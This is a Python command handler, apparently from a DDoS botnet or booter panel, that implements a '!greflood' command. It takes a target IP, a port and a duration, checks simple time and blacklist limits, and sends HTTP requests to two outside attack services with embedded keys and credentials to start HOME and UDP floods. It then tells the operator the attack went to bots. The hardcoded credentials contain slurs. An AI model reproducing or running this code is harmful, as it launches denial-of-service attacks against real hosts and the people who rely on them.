import requests
from colorama import Fore
import time

last_greflood_time = 0
blacklist = ['94.103.91.120', '10.0.0.2']  # Пример чёрного списка IP-адресов

def greflood(args, validate_time, send, client, ansi_clear, broadcast, data):
    global last_greflood_time
    if len(args) == 5:
        ip = args[1]
        time_str = args[2]
        port = args[3].split('=')[1]
        length = args[4].split('=')[1]
        try:
            time_int = int(time_str)
            if time_int > 60:
                send(client, "Your max time is 60 seconds")
                return
            if time.time() - last_greflood_time < 60:
                send(client, "Your max concurrent is 1")
                return

            if ip in blacklist:
                send(client, "This IP is blacklisted")
                return

            res1 = requests.get(f'http://176.97.210.213/api.php?key=sqpenis&host={ip}&port={port}&time={time_str}&method=HOME')
            res2 = requests.get(f'https://cepto.gay/api/attack?username=niggersosi1&password=loxlox&host={ip}&port={port}&time={time_str}&method=UDP')
            if validate_time(str(time_int)):
                last_greflood_time = time.time()
                send(client, f"{Fore.WHITE}Attack sent to {Fore.RED}3 {Fore.WHITE}bots - ID: 927832")
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-60 seconds)')
        except Exception as e:
            send(client, f'Error: {str(e)}')
    else:
        send(client, f'{Fore.WHITE}Usage: !greflood [IP] [TIME] PORT=[port] len=[len]')


